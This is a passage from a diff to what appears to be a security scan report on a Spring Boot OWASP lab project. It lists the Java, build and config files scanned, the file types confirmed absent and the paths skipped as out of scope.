+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\ProductService.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\CommentService.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\repository\UserRepository.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\repository\ProductRepository.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\repository\CommentRepository.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\User.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\Product.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\model\Comment.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\dto\ProductCreateRequest.java`
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\dto\CommentCreateRequest.java`
 
-*End of report.*
+### Build / config
+
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\pom.xml` (read in full)
+- `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties` (read in full)
+
+### Confirmed absent (no scan required)
+
+- `application.yml` / `application.yaml` - none in tree (`Glob **/*.yml` returned no matches).
+- Thymeleaf templates - none (`Glob **/templates/**` returned no matches).
+- Static assets - none (`Glob **/static/**` returned no matches).
+- Test sources - none (`Glob **/test/**/*` returned no matches).
+- Build descriptor other than `pom.xml` - no `build.gradle*` exists.
+
+### Skipped (out of scope)
+
+- `target/classes/application.properties` - build output.
+- `.claude/**` - agent contracts, not application source.
+- `.github/workflows/build-and-security.yml` - CI script; not opened in this scan (the `pom.xml` is the authoritative source for build plugins).
